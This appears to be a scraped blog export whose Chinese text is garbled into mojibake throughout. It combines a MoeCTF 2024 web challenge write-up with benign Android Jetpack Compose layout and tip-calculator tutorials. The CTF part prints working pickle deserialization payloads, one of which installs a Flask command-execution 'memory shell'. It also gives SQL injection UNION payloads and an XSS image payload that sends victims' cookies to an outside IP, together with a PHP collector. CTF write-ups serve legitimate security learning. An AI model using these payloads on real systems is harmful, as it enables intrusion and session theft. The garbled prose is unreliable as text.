ä»å¤–éƒ¨äº‘è¿™é‡Œå¯ä»¥å‘ç°ï¼Œimageè·¯ç”±å¯ä»¥å¯¹å†…éƒ¨äº‘è¿›è¡Œè¯·æ±‚è·å–å›¾ç‰‡ã€‚\nå…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åå¯¹å…¶æŠ“åŒ…ï¼Œå°è¯•çˆ†ç ´å†…éƒ¨äº‘ç«¯å£ã€‚\nhttp://127.0.0.1:56188/image?url=http://localhost:5412/image/flag.jpg #\rwho\u0026rsquo;s blog?\nè¿›å…¥é¢˜ç›®ï¼Œæç¤ºç”¨idæ¥è¿›è¡Œä¼ å‚ã€‚é¢˜ç›®ç¯å¢ƒæ˜¯ç”¨pythonæ­å»ºçš„ï¼Œå®¹æ˜“æƒ³åˆ°SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚\nflagåœ¨ç¯å¢ƒå˜é‡é‡Œ\nPetStore #\ré¢˜ç›®ç»™å‡ºæç¤ºæ˜¯å…³äºpythonçš„pickleååºåˆ—åŒ–æ¼æ´ã€‚\næ‹¿åˆ°æºç å…³æ³¨å¯¼å…¥éƒ¨åˆ†çš„å‡½æ•°\ndef import_pet(self, serialized_pet) -\u0026gt; bool:\rtry:\rpet_data = base64.b64decode(serialized_pet)\rpet = pickle.loads(pet_data)\rif isinstance(pet, Pet):\rfor i in self.pets:\rif i.uuid == pet.uuid:\rreturn False\rself.pets.append(pet)\rreturn True\rreturn False\rexcept Exception as e:\rprint(f\u0026#34;Import failed: {str(e.decode())}\u0026#34;)\rreturn False å¯ä»¥çœ‹åˆ°è¿™ä¸ªè·¯ç”±æ˜¯ç›´æ¥æ‹¿åˆ°æ•°æ®å°±è¿›è¡Œloadï¼Œè¿™é‡Œå°±å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œåç»­çš„ä¸é‡è¦ã€‚\nç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ— æ³•å¤–å¸¦ï¼Œç»è¿‡ä¿¡æ¯æœé›†ä¹‹åå‘ç°ï¼ŒFlaskå¯ä»¥è¿›è¡Œå†™å…¥å†…å­˜é©¬ã€‚\nä¸‹é¢æ˜¯ç›¸å…³çŸ¥è¯†é“¾æ¥ã€‚\n(ãƒ»Ï‰\u0026lt; )â˜…Flaskå†…å­˜é©¬ | é›²æµã®Lowest World (c1oudfl0w0.github.io)\nflaskä¸å‡ºç½‘å›æ˜¾æ–¹å¼ - Longlone\u0026rsquo;s Blog\nimport pickle\rimport base64\rimport uuid\rimport os\rclass Pet:\rdef __init__(self, name, species) -\u0026gt; None:\rself.name = name\rself.species = species\rself.uuid = uuid.uuid4()\rdef __repr__(self) -\u0026gt; str:\rreturn f\u0026#34;Pet(name={self.name}, species={self.species}, uuid={self.uuid})\u0026#34;\rdef __reduce__(self):\rreturn (eval,(\u0026#34;__import__(\\\u0026#34;sys\\\u0026#34;).modules[\u0026#39;__main__\u0026#39;].__dict__[\u0026#39;app\u0026#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(\u0026#39;os\u0026#39;).popen(request.args.get(\u0026#39;cmd\u0026#39;)).read())\u0026#34;,))\rp = Pet(\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;)\ropcode = pickle.dumps(p)\ropcode_encode = base64.b64encode(opcode).decode()\rprint(opcode_encode)\r#gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygic3lzIikubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg== ç„¶åå°†å­—ç¬¦ä¸²è¿›è¡Œimportï¼Œå³å¯åœ¨æœåŠ¡ä¸Šäº§ç”Ÿä¸€ä¸ªæ–°çš„ç›‘å¬ï¼Œå¯¹cmdå‚æ•°çš„å‘½ä»¤æ‰§è¡Œã€‚\nè¿˜æœ‰ä¸€ä¸ªæ›´ç®€å•çš„è§£æ³•ï¼Œç›´æ¥æŠŠflagå­˜å…¥storeé‡Œ\nimport base64\rimport pickle\rclass Test:\rdef __reduce__(self):\rreturn (exec, (\u0026#34;import os; store.create_pet(os.getenv(\u0026#39;FLAG\u0026#39;), \u0026#39;flag\u0026#39;);\u0026#34;,))\rif __name__ == \u0026#34;__main__\u0026#34;:\rprint(base64.b64encode(pickle.dumps(Test())).decode(\u0026#34;utf-8\u0026#34;)) smbms #\ré¢˜ç›®ç»™å‡ºçš„æµ‹è¯•sqlé™„ä»¶ä¸­å‘ç°å¯†ç æ˜¯å¼±å¯†ç ï¼Œå¯ä»¥å­—å…¸çˆ†ç ´\nå¯†ç æ˜¯1234567ï¼Œå°±å¯ä»¥ç™»è¿›å»äº†ã€‚\nåœ¨è·å–ç”¨æˆ·åˆ—è¡¨è¿™é‡Œæ˜¯ä½¿ç”¨çš„ç›´æ¥æ‹¼æ¥userNameï¼Œå†ç”¨%è¿›è¡ŒåŒ…è£¹ã€‚å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œæ˜¯å•å¼•å·é—­åˆï¼Œåªéœ€è¦æŠŠåé¢çš„ç™¾åˆ†å·æ— æ•ˆåŒ–å°±è¡Œäº†ã€‚æ•°æ®åº“çš„åˆ—æ•°åœ¨sqlçš„æµ‹è¯•æ–‡ä»¶ä¸­æœ‰ï¼Œæœ€ç»ˆå°è¯•åˆ°14åˆ—ã€‚\nå­™%\u0026#39; union select 1,(select database()),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 å¯ä»¥çœ‹åˆ°æˆåŠŸçˆ†å‡ºæ•°æ®åº“å\nå­™%\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 å­™%\u0026#39; union select 1,(select flag from flag),3,4,5,6,7,8,9,10,11,12,13,14 where \u0026#39;1%\u0026#39;=\u0026#39;1 MessageBox #\rç»å…¸çš„webç•™è¨€æ¿\nä»æºç åˆ†æå¯ä»¥å¾—å‡ºï¼Œåªæœ‰luoç”¨æˆ·çš„cookieä¸­æ‰å…·æœ‰çœŸæ­£çš„flag\nè€Œç•™è¨€æ¿å¯ä»¥çœ‹åˆ°è‡ªå·±å‘å‡ºçš„ï¼Œä¹Ÿå¯çœ‹åˆ°åˆ«äººå‘ç»™è‡ªå·±çš„\nåˆæ­¥çŒœæµ‹æ˜¯XSSæ¼æ´\næˆ‘åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºäº†ä¸¤ä¸ªæ–‡ä»¶ä¾¿äºé¶æœºå¤–å¸¦cookie\nä¸€ä¸ªæ˜¯test1.phpï¼Œå¦ä¸€ä¸ªæ˜¯ç©ºçš„data.txt\n\u0026lt;?php\r$file = \u0026#39;data.txt\u0026#39;;\r// å†™å…¥æ–‡ä»¶\rif (!empty($_GET)) {\r$params = http_build_query($_GET);\r$escaped_params = htmlspecialchars($params, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;);\rfile_put_contents($file, $escaped_params . \u0026#34;\\n\u0026#34;, FILE_APPEND);\r}\r// è¯»å–å¹¶æ˜¾ç¤ºæ–‡ä»¶å†…å®¹\rif (file_exists($file)) {\recho nl2br(file_get_contents($file));\r} else {\recho \u0026#34;æ²¡æœ‰æä¾›ä»»ä½•å‚æ•°\u0026#34;;\r}\r?\u0026gt; ç„¶åå°†ä»¥ä¸‹ä¿¡æ¯å‘ç»™luo\n\u0026lt;img src=x onerror=this.src=\u0026#39;http://49.235.164.104/test1.php?c=\u0026#39;+document.cookie\u0026gt; ç¨ç­‰ä¸€ä¼šï¼Œxssåå¼¹å›æ¥å°±å¾—åˆ°äº†çœŸæ­£çš„flag\n","date":"2024-08-13","externalUrl":null,"permalink":"/posts/2024/08/moectf-2024/","section":"Posts","summary":"","title":"MoeCTF 2024","type":"posts"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/tags/android/","section":"Tags","summary":"","title":"Android","type":"tags"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/categories/android/","section":"Categories","summary":"","title":"Android","type":"categories"},{"content":"\rç›®æ ‡ #\ræ„å»ºä¸€ä¸ªå¥åº·åº”ç”¨ï¼Œè¿™æ¬¾åº”ç”¨åŒ…å«ä¸¤ä¸ªç‰ˆå—ï¼Œä¸€ä¸ªåˆ—å‡ºäº†æ”¶è—åˆé›†ï¼Œå¦ä¸€ä¸ªåˆ—å‡ºäº†å„ç§ä½“è‚²é”»ç‚¼ã€‚å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒåŒ…æ‹¬ç«–å±å’Œæ¨ªå±çš„é€‚é…\nä¸»è¦å†…å®¹ #\rå€ŸåŠ©ä¿®é¥°ç¬¦æ‰©å……å¯ç»„åˆé¡¹\né€šè¿‡ Column å’Œ LazyRow ç­‰æ ‡å‡†å¸ƒå±€ç»„ä»¶å®šä½å¯ç»„åˆå­é¡¹\né€šè¿‡å¯¹é½æ–¹å¼å’Œæ’åˆ—æ–¹å¼æ›´æ”¹å¯ç»„åˆå­é¡¹åœ¨çˆ¶é¡¹ä¸­çš„ä½ç½®\nå€ŸåŠ© Scaffold å’Œ Bottom Navigation ç­‰ Material å¯ç»„åˆé¡¹åˆ›å»ºè¯¦ç»†å¸ƒå±€\nä½¿ç”¨æ§½ä½ API æ„å»ºçµæ´»çš„å¯ç»„åˆé¡¹\nä¸ºä¸åŒçš„å±å¹•é…ç½®æ„å»ºå¸ƒå±€\nç»“æ„åˆ†æ #\ræ€»ä½“æ¥è¯´å¯ä»¥å°†åº”ç”¨åˆ†ä¸ºå†…å®¹å’Œå¯¼èˆªæ ä¸¤ä¸ªéƒ¨åˆ†\nåœ¨å†…å®¹éƒ¨åˆ†åˆå¯ä»¥åˆ†ä¸ºæœç´¢æ ã€æ”¶è—æ ä»¥åŠè¿åŠ¨æ”¶é›†ç½‘æ ¼\næœç´¢æ  #\r@Composable\rfun SearchBar(modifier: Modifier=Modifier)\r{\rTextField(value = \u0026#34;\u0026#34;,\ronValueChange = {},\rmodifier= modifier\r.fillMaxWidth()\r.heightIn(min = 56.dp),\rleadingIcon = {\rIcon(painter = painterResource(id = R.drawable.search), contentDescription = null )\r},\rcolors = TextFieldDefaults.colors(\runfocusedLabelColor = MaterialTheme.colorScheme.surface,\rfocusedContainerColor = MaterialTheme.colorScheme.surface,\r),\rplaceholder = {\rText(text = stringResource(R.string.search))\r}\r)\r} å›¾æ ‡æ˜¯åœ¨Browse Fonts - Google Fontsè¿™é‡Œä¸‹è½½çš„ã€‚æ€»ä½“ä»£ç è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿™é‡Œå…ˆä¸æ¶‰åŠå…·ä½“çš„æ–‡æœ¬å¤„ç†ã€‚\næ”¶è—æ  #\ré¦–å…ˆè¦åˆ†ææ¯ä¸ªå…ƒç´ çš„å…·ä½“ç»“æ„ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œè¦å¯¹å›¾ç‰‡è¿›è¡Œè£å‰ªï¼Œå¹¶ä¸”åœ¨å›¾ç‰‡ä¸‹é¢è¦å¯¹é½ç›¸åº”çš„æ–‡å­—ã€‚\nä½¿ç”¨modifierçš„clipå¯¹å›¾ç‰‡è¿›è¡Œè£å‰ªï¼Œå¹¶ä¸”å¯èƒ½ä¼šå‡ºç°è£å‰ªä¹‹åæœ‰æ®‹ç¼ºï¼Œåˆç”¨äº†ContentScaleå¯¹å›¾ç‰‡è¿›è¡Œé€‚å½“ç¼©æ”¾æ¥å¡«æ»¡clipçš„å½¢çŠ¶\n@Composable\rfun AlignYourBodyElement(\rmodifier: Modifier=Modifier,\r@DrawableRes drawable:Int,\r@StringRes text:Int\r)\r{\rColumn(\rhorizontalAlignment = Alignment.CenterHorizontally,\rmodifier = modifier\r) {\rImage(painter = painterResource(id = drawable),\rcontentDescription =null ,\rmodifier= Modifier\r.size(88.dp)\r.clip(CircleShape),\rcontentScale = ContentScale.Crop\r)\rText(text = stringResource(id = text),\rmodifier=Modifier.paddingFromBaseline(top = 24.dp, bottom = 8.dp)\r)\r}\r} è¿™é‡Œæ¶‰åŠåˆ°äº†**@DrawableReså’Œ@StringResä¸¤ä¸ªä¿®é¥°ç¬¦ï¼Œæ˜¾å¼è§„å®šäº†ä¼ å…¥å‚æ•°çš„ç±»å‹å¯ä»¥è¢«å½“ä½œresourceå¤„ç†ã€‚ç±»ä¼¼äº R.string.username è¿™æ ·çš„èµ„æºå¼•ç”¨æ–¹å¼ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºä¸­æ˜¯ä»¥Intæ•°å­—ç±»å‹è¿›è¡Œä¼ é€’çš„ï¼ˆå¯ä»¥è°ƒè¯•æŸ¥çœ‹ï¼‰ã€‚æ·»åŠ æ³¨è§£åï¼Œç¼–è¯‘å™¨ä¼šæå‰æ£€æŸ¥èµ„æº**æ˜¯å¦åˆæ³•å­˜åœ¨ï¼Œé˜²æ­¢é”™è¯¯çš„èµ„æºç±»å‹ä¼ é€’ã€‚\nå‰©ä¸‹çš„å°±æ˜¯å°†æ¯ä¸ªå…ƒç´ è¿›è¡Œæ¨ªå‘æ’åˆ—\n@Composable\rfun AlignYourBodyRow(modifier: Modifier=Modifier)\r{\rval alignYourBodyData=\rlistOf(\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\rAlignYourBodyData(R.drawable.tomcat,R.string.username),\r)\rLazyRow(\rmodifier=modifier,\rhorizontalArrangement = Arrangement.spacedBy(8.dp),\rcontentPadding = PaddingValues(horizontal = 16.dp)\r){\ritems(alignYourBodyData){\ritem-\u0026gt; AlignYourBodyElement(drawable = item.drawable, text = item.text)\r}\r}\r} è¿™é‡Œä½¿ç”¨åˆ°äº†LazyRowï¼ˆæ‡’åŠ è½½ï¼‰è€Œä¸æ˜¯Rowï¼ŒåŸå› å°±åœ¨äºï¼ŒLazyRow åªä¼šæ¸²æŸ“å½“å‰è§†å›¾ä¸­çš„å†…å®¹ï¼Œæœ‰åŠ©äºæé«˜åº”ç”¨çš„æ€§èƒ½ã€‚\nè¿åŠ¨æ”¶é›†ç½‘æ ¼ #\rdata class FavoriteCollectionsData(\r@DrawableRes val drawable: Int,\r@StringRes val text: Int\r)\r@Composable\rfun FavoriteCollectionsGrid(modifier: Modifier=Modifier)\r{\rval favoriteCollectionsData= listOf(\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\rFavoriteCollectionsData(R.drawable.tomcat,R.string.username),\r)\rLazyHorizontalGrid(\rrows = GridCells.Fixed(2),\rmodifier=modifier.height(168.dp),\rcontentPadding = PaddingValues(horizontal = 16.dp),\rhorizontalArrangement = Arrangement.spacedBy(16.dp),\rverticalArrangement = Arrangement.spacedBy(16.dp)\r) {\ritems(favoriteCollectionsData){\ritem-\u0026gt; FavoriteCollectionCard(drawable = item.drawable, text = item.text, modifier = Modifier.height(80.dp))\r}\r}\r} LazyHorizontalGridåŒæ ·æ˜¯æ‡’åŠ è½½çš„ç»„ä»¶ï¼ŒæŒ‡å®šäº†è¡Œæ•°rowä¹‹åä¼šè‡ªåŠ¨æ’åˆ—ï¼Œç„¶åä½¿ç”¨itemsè¿›è¡Œå­å…ƒç´ ç”Ÿæˆ\nå†…å®¹æ’æ§½ #\r@Composable\rfun HomeSection(\r@StringRes title: Int,\rmodifier: Modifier = Modifier,\rcontent: @Composable () -\u0026gt; Unit\r) {\rColumn(modifier=modifier) {\rText(\rtext = stringResource(title),\rstyle = MaterialTheme.typography.titleMedium,\rmodifier = Modifier\r.paddingFromBaseline(top = 40.dp, bottom = 16.dp)\r.padding(horizontal = 16.dp),\r)\rcontent()\r}\r} å°†å†…å®¹ä¼ å…¥HomeSectionæ’æ§½æ¥ä½¿ç”¨ï¼Œå¢å¼ºä»£ç çš„ç»“æ„æ€§ã€‚å…·ä½“å¦‚ä¸‹ï¼Œå¹¶ä¸”è¦ä½¿ç”¨verticalScrollæ·»åŠ å¯æ»‘åŠ¨æ•ˆæœ\n//ä¸»ä½“ä»£ç \r@Composable\rfun HomeScreen(modifier: Modifier = Modifier) {\rColumn(\rmodifier= modifier\r.fillMaxHeight()\r.background(color = Color(0xFFdbccb9))\r.verticalScroll(\rrememberScrollState()\r)\r.padding(bottom = 20.dp)\r) {\rSpacer(modifier = Modifier.height(16.dp))\rSearchBar(Modifier.padding(horizontal = 16.dp))\rHomeSection(title = R.string.username) {\rAlignYourBodyRow()\r}\rHomeSection(title = R.string.username) {\rFavoriteCollectionsGrid()\r}\r}\r} å¯¼èˆªæ  #\rç”±äºæ¶‰åŠåˆ°æ¨ªå±å’Œç«–å±ä¸¤ç§æƒ…å†µï¼Œå¯¼èˆªæ å¾—åšä¸¤ä¸ª\n//ç«–å± NavigationBar( modifier = modifier, ){ NavigationBarItem( icon = { Icon( imageVector = Icons.Default.Home, contentDescription = stringResource(id = R.string.username) ) }, label = { Text( text = stringResource(id = R.string.home) ) }, selected = true, onClick = {} ) NavigationBarItem( icon = { Icon( imageVector = Icons.Default.AccountCircle, contentDescription = null ) }, label = { Text( text = stringResource(id = R.string.profile) ) }, selected = false, onClick = {} ) } Jetpack Composeååˆ†è´´å¿ƒï¼Œå†…ç½®äº†åº•éƒ¨å¯¼èˆªæ çš„ç»„ä»¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚\n//æ¨ªå± @Composable private fun SootheNavigationRail(modifier: Modifier=Modifier) { NavigationRail( modifier=modifier.padding(top = 8.dp, bottom = 8.dp), containerColor = MaterialTheme.colorScheme.background, ) { Column( modifier=modifier.fillMaxHeight(), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally ) { NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.Home, contentDescription = null ) }, label = { Text(text = stringResource(id = R.string.home)) }, ) Spacer(modifier = Modifier.height(8.dp)) NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.AccountCircle, contentDescription = null) }, label = { Text(text = stringResource(id = R.string.profile)) } ) } } } åˆ¤æ–­è®¾å¤‡çŠ¶æ€ #\rå®˜æ–¹çš„å¼•ç”¨æ–¹å¼ï¼šçª—å£å¤§å°ç±»åˆ« |Â Jetpack Compose |Â Android Developers (google.cn)\n@OptIn(ExperimentalMaterial3AdaptiveApi::class) @Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { // Perform logic on the size class to decide whether to show the top app bar. val showTopAppBar = windowSizeClass.windowHeightSizeClass != WindowHeightSizeClass.COMPACT // MyScreen knows nothing about window sizes, and performs logic based on a Boolean flag. MyScreen( showTopAppBar = showTopAppBar, /* ... */ ) } éšæ„é€‰æ‹©å³å¯ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯é«˜åº¦åˆ¤æ–­ï¼Œå¹¶ä¸”åªå…³å¿ƒäº†æ‰‹æœºè®¾å¤‡\n@Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { // Perform logic on the size class to decide whether to show the top app bar. when(windowSizeClass.windowHeightSizeClass) { WindowHeightSizeClass.MEDIUM,WindowHeightSizeClass.EXPANDED-\u0026gt;{ Scaffold( bottomBar = { SootheBottomNavigation() } ) { padding -\u0026gt; HomeScreen(Modifier.padding(padding)) } } WindowHeightSizeClass.COMPACT-\u0026gt;{ Row { SootheNavigationRail() HomeScreen() } } } } å¦‚æœæ˜¯å¸¸è§„çš„ç«–å±æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨Scaffoldç»„ä»¶æ¥è¿›è¡Œå¿«é€Ÿåˆ›å»ºåŒ…å«å„ç§å¯¼èˆªæ çš„ç•Œé¢ã€‚\nåœ¨æ¨ªå±çŠ¶æ€ä¸‹ï¼Œå¯¼èˆªæ å’Œä¸»ä½“å†…å®¹åº”è¯¥æ˜¯æˆæ¨ªå‘æ’åˆ—çš„\næ€»ä½“ä»£ç  #\rclass MainActivity : ComponentActivity() { override fun onCreate(savedInstanceState: Bundle?) { super.onCreate(savedInstanceState) enableEdgeToEdge() setContent { MyApplicationTheme { MyApp() } } } } data class AlignYourBodyData( @DrawableRes val drawable:Int, @StringRes val text:Int ) data class FavoriteCollectionsData( @DrawableRes val drawable: Int, @StringRes val text: Int ) @Composable fun FavoriteCollectionsGrid(modifier: Modifier=Modifier) { val favoriteCollectionsData= listOf( FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), FavoriteCollectionsData(R.drawable.tomcat,R.string.username), ) LazyHorizontalGrid( rows = GridCells.Fixed(2), modifier=modifier.height(168.dp), contentPadding = PaddingValues(horizontal = 16.dp), horizontalArrangement = Arrangement.spacedBy(16.dp), verticalArrangement = Arrangement.spacedBy(16.dp) ) { items(favoriteCollectionsData){ item-\u0026gt; FavoriteCollectionCard(drawable = item.drawable, text = item.text, modifier = Modifier.height(80.dp)) } } } @Composable fun AlignYourBodyRow(modifier: Modifier=Modifier) { val alignYourBodyData= listOf( AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), AlignYourBodyData(R.drawable.tomcat,R.string.username), ) LazyRow( modifier=modifier, horizontalArrangement = Arrangement.spacedBy(8.dp), contentPadding = PaddingValues(horizontal = 16.dp) ){ items(alignYourBodyData){ item-\u0026gt; AlignYourBodyElement(drawable = item.drawable, text = item.text) } } } @Composable fun AlignYourBodyElement( modifier: Modifier=Modifier, @DrawableRes drawable:Int, @StringRes text:Int ) { Column( horizontalAlignment = Alignment.CenterHorizontally, modifier = modifier ) { Image(painter = painterResource(id = drawable), contentDescription =null , modifier= Modifier .size(88.dp) .clip(CircleShape), contentScale = ContentScale.Crop ) Text(text = stringResource(id = text), modifier=Modifier.paddingFromBaseline(top = 24.dp, bottom = 8.dp) ) } } @Composable fun SearchBar(modifier: Modifier=Modifier) { TextField(value = \u0026#34;\u0026#34;, onValueChange = {}, modifier= modifier .fillMaxWidth() .heightIn(min = 56.dp), leadingIcon = { Icon(painter = painterResource(id = R.drawable.search), contentDescription = null ) }, colors = TextFieldDefaults.colors( unfocusedLabelColor = MaterialTheme.colorScheme.surface, focusedContainerColor = MaterialTheme.colorScheme.surface, ), placeholder = { Text(text = stringResource(R.string.search)) } ) } @Composable fun FavoriteCollectionCard( modifier: Modifier=Modifier, @DrawableRes drawable: Int, @StringRes text:Int ) { Surface( shape = MaterialTheme.shapes.medium, modifier = modifier, color = MaterialTheme.colorScheme.surfaceVariant ) { Row ( verticalAlignment = Alignment.CenterVertically, modifier=modifier.width(255.dp) ){ Image(painter = painterResource(id = drawable), contentDescription =null, modifier=Modifier.size(80.dp), contentScale = ContentScale.Crop ) Text(text = stringResource(id = text)) } } } @Composable fun HomeSection( @StringRes title: Int, modifier: Modifier = Modifier, content: @Composable () -\u0026gt; Unit ) { Column(modifier=modifier) { Text( text = stringResource(title), style = MaterialTheme.typography.titleMedium, modifier = Modifier .paddingFromBaseline(top = 40.dp, bottom = 16.dp) .padding(horizontal = 16.dp), ) content() } } @Composable fun HomeScreen(modifier: Modifier = Modifier) { Column( modifier= modifier .fillMaxHeight() .background(color = Color(0xFFdbccb9)) .verticalScroll( rememberScrollState() ) .padding(bottom = 20.dp) ) { Spacer(modifier = Modifier.height(16.dp)) SearchBar(Modifier.padding(horizontal = 16.dp)) HomeSection(title = R.string.username) { AlignYourBodyRow() } HomeSection(title = R.string.username) { FavoriteCollectionsGrid() } } } @Composable private fun SootheBottomNavigation(modifier: Modifier=Modifier){ NavigationBar( modifier = modifier, ){ NavigationBarItem( icon = { Icon( imageVector = Icons.Default.Home, contentDescription = stringResource(id = R.string.username) ) }, label = { Text( text = stringResource(id = R.string.home) ) }, selected = true, onClick = {} ) NavigationBarItem( icon = { Icon( imageVector = Icons.Default.AccountCircle, contentDescription = null ) }, label = { Text( text = stringResource(id = R.string.profile) ) }, selected = false, onClick = {} ) } } @Composable private fun SootheNavigationRail(modifier: Modifier=Modifier) { NavigationRail( modifier=modifier.padding(top = 8.dp, bottom = 8.dp), containerColor = MaterialTheme.colorScheme.background, ) { Column( modifier=modifier.fillMaxHeight(), verticalArrangement = Arrangement.Center, horizontalAlignment = Alignment.CenterHorizontally ) { NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.Home, contentDescription = null ) }, label = { Text(text = stringResource(id = R.string.home)) }, ) Spacer(modifier = Modifier.height(8.dp)) NavigationRailItem(selected = false, onClick = { /*TODO*/ }, icon = { Icon(imageVector = Icons.Default.AccountCircle, contentDescription = null) }, label = { Text(text = stringResource(id = R.string.profile)) } ) } } } @Composable fun MyApp( windowSizeClass: WindowSizeClass = currentWindowAdaptiveInfo().windowSizeClass ) { when(windowSizeClass.windowHeightSizeClass) { WindowHeightSizeClass.MEDIUM,WindowHeightSizeClass.EXPANDED-\u0026gt;{ Scaffold( bottomBar = { SootheBottomNavigation() } ) { padding -\u0026gt; HomeScreen(Modifier.padding(padding)) } } WindowHeightSizeClass.COMPACT-\u0026gt;{ Row { SootheNavigationRail() HomeScreen() } } } } @Preview(showBackground = true) @Composable fun MyPreview() { MyApplicationTheme { MyApp() } } ","date":"2024-07-12","externalUrl":null,"permalink":"/posts/2024/07/basic-layouts-in-android-compose/","section":"Posts","summary":"","title":"Android-Composeä¸­çš„åŸºæœ¬å¸ƒå±€","type":"posts"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/tags/app/","section":"Tags","summary":"","title":"App","type":"tags"},{"content":"","date":"2024-07-12","externalUrl":null,"permalink":"/categories/web-develop/","section":"Categories","summary":"","title":"Web-Develop","type":"categories"},{"content":"\rå‰è¨€ #\råœ¨ä¸Šä¸€ç¯‡æ‘‡éª°å­çš„æ–‡ç« é‡Œï¼Œåœ¨å±€éƒ¨ä½¿ç”¨äº†remember multableStateofç”¨äºå°†å˜é‡å­˜äºå†…å­˜ä¹‹ä¸­ï¼Œä»¥ä¾¿äºçŠ¶æ€å˜æ¢ã€‚è¿™ç¯‡æ–‡ç« çš„ä¸»è¦å†…å®¹æ˜¯è®¾è®¡ä¸€ä¸ªç®€å•çš„å°è´¹è®¡ç®—å™¨ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰é€‰é¡¹ã€‚\nè§†å›¾ç»“æ„ #\ræ•´ä½“æ¥è¯´æ˜¯ä¸€ä¸ªColumnæŸ±å½¢ç»“æ„ï¼Œåœ¨ä¸­é—´ç»™å‡ºå‘ä¸Šå–æ•´çš„é€‰é¡¹ï¼Œæ ¹æ®Bill Amountå’ŒPercentageçš„å®æ—¶å˜åŒ–ï¼Œä¸‹é¢çš„Tip Amountä¹Ÿä¼šè·Ÿç€å˜\nè§£å†³æ–¹æ¡ˆ #\rè¦å®ç°Tip Amoutçš„å®æ—¶æ›´æ–°ï¼Œé‚£ä¹ˆå°±éœ€è¦æŠŠå˜é‡è®¾ç½®ä¸ºæœ€é¡¶çº§åŸŸï¼Œå¹¶ä¸”ä¼ å…¥å†…å­˜\n@Composable\rfun TipTimeLayout(modifier: Modifier=Modifier)\r{\rvar roundUp by remember { mutableStateOf(false) }\rvar amountInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\rvar tipInput by remember { mutableStateOf(\u0026#34;\u0026#34;) }\r} å¯¹åŸå§‹çš„TextFieldè¿›è¡Œé‡æ–°å°è£…ï¼Œè¿™é‡Œçš„onValueChangeæ˜¯ä¸€ä¸ªlambdaè¡¨è¾¾å¼ï¼ŒæŒ‡çš„æ˜¯æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåé¢ä¼šå°†å…¶ä¼ ç»™Valueæ˜¾ç¤º\n@Composable\rfun EditNumberField(value:String,\ronValueChange:(String)-\u0026gt;Unit,\rmodifier: Modifier = Modifier,\rid:Int,\rkeyboardOptions: KeyboardOptions,\r) {\rTextField(\rvalue = value,\ronValueChange = onValueChange,\rmodifier = modifier,\rlabel = { Text(text = stringResource(id = id))},\rkeyboardOptions = keyboardOptions\r)\r} Tipè®¡ç®—å‡½æ•°ä¼šæ ¹æ®ä¼ å…¥çš„routUpå¸ƒå°”å€¼è¿›è¡Œé€‰æ‹©æ€§å‘ä¸Šå–æ•´\nprivate fun calculateTip(amount: Double, tipPercent: Double=15.0,roundUp: Boolean):String{\rvar tip = tipPercent / 100 * amount\rif (roundUp) {\rtip = kotlin.math.ceil(tip)\r}\rreturn NumberFormat.getCurrencyInstance().format(tip)\r} 